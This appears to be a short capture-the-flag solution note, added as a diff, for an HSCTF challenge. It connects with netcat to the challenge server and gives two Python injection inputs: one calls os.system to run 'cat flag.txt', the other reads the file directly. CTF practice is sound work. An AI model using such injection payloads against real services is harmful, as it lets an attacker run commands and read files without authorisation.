@@ -1,0 +1,4 @@
+run `nc misc.hsctf.com 9001`
+give input: str(__import__('os').system("cat flag.txt"))
+or
+give input: open('flag.txt', 'r').readlines()
